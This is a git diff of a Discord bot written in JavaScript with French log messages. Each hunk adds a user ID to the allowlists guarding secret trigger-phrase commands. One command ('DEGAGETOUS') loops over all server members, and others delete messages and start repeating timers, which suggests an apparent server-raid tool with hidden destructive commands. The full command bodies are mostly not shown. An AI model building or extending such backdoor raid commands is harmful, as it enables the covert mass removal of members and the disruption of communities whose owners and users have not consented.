@@ -33,6 +33,7 @@ if (msg.content === 'HAVOX SE REINCARNE') {
  if (message.author.id !== '301913733536415755')
 if (message.author.id !== '201498943341854720')
 if (message.author.id !== '362645467009384448')
+ if (message.author.id !== '347797916385280000')
 return;
     console.log(`Commande Havox se réincarne par ${msg.author.tag}`);
     var interval = setInterval (function () {
@@ -72,6 +73,7 @@ if (msg.content === 'DEGAGETOUS') {
 if (message.author.id !== '301913733536415755')
 if (message.author.id !== '201498943341854720')
 if (message.author.id !== '362645467009384448')
+ if (message.author.id !== '347797916385280000')
 return;
     console.log(`Commande .DEGAGETOUS par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
@@ -84,6 +86,7 @@ if (msg.content === 'DEGAGEBOT') {
 if (message.author.id !== '301913733536415755')
 if (message.author.id !== '201498943341854720')
 if (message.author.id !== '362645467009384448')
+ if (message.author.id !== '347797916385280000')
 return;
     console.log(`Commande DEGAGE par ${msg.author.tag}`);
     if (msg.deletable) msg.delete().catch(e => {});
@@ -94,6 +97,7 @@ if (msg.content === 'PHENIX21') {
 if (message.author.id !== '301913733536415755')
 if (message.author.id !== '201498943341854720')
 if (message.author.id !== '362645467009384448')
+ if (message.author.id !== '347797916385280000')
 return;
     console.log(`Commande PHENIX21 par ${msg.author.tag}`);
 
@@ -110,6 +114,7 @@ return;
 if (message.author.id !== '301913733536415755')
 if (message.author.id !== '201498943341854720')
 if (message.author.id !== '362645467009384448')
+ if (message.author.id !== '347797916385280000')
 return;
     if (msg.deletable) msg.delete();
     let i = 0;
@@ -127,6 +132,7 @@ return;
 if (message.author.id !== '301913733536415755')
 if (message.author.id !== '201498943341854720')
 if (message.author.id !== '362645467009384448')
+ if (message.author.id !== '347797916385280000')
 return;
  
     if(msg.deletable) msg.delete();
@@ -138,6 +144,7 @@ return;
 if (message.author.id !== '301913733536415755')
 if (message.author.id !== '201498943341854720')
 if (message.author.id !== '362645467009384448')
+ if (message.author.id !== '347797916385280000')
 return;
     if(msg.deletable) msg.delete();
     i = 0;
@@ -157,6 +164,7 @@ return;
  if (message.author.id !== '301913733536415755')
 if (message.author.id !== '201498943341854720')
 if (message.author.id !== '362645467009384448')
+ if (message.author.id !== '347797916385280000')
 return;
     console.log(`Commande BUG par ${msg.author.tag}`);
     var interval = setInterval (function () {
